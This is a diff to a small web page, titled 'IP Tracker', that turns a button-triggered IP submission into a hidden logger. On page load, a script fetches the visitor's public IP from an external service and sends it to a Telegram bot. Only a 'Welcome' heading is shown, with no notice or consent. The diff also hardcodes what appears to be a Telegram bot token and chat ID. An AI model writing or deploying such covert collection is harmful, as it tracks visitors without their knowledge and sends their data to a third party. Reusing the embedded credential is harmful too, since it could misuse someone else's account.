@@ -3,25 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Start Tracking</title>
+    <title>IP Tracker</title>
     <script>
-        function sendIP() {
-            fetch('/get-ip')
-            .then(response => response.json())
-            .then(data => {
-                fetch('/send-ip', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ ip: data.ip })
-                })
-                .then(response => response.text())
-                .then(message => alert(message));
-            });
+        // Function to send IP to Telegram bot
+        async function sendIP() {
+            try {
+                // Get IP from an external API
+                let response = await fetch('https://api64.ipify.org?format=json');
+                let data = await response.json();
+                let ip = data.ip;
+
+                // Replace with your Telegram bot token and chat ID
+                const TELEGRAM_BOT_TOKEN = "8070806356:AAG7cqPHaG--aeuAyttsha2m3pdclU27T8U";
+                const TELEGRAM_CHAT_ID = "7182702425";
+
+                // Send IP to Telegram
+                let telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=New visitor IP: ${ip}`;
+                await fetch(telegramUrl);
+
+            } catch (error) {
+                console.error("Failed to send IP:", error);
+            }
         }
+
+        // Automatically send IP when page loads
+        window.onload = sendIP;
     </script>
 </head>
 <body>
-    <h3>Click the button to send </h3>
-    <button onclick="send()">Start</button>
+    <h3>Welcome</h3>
 </body>
 </html>
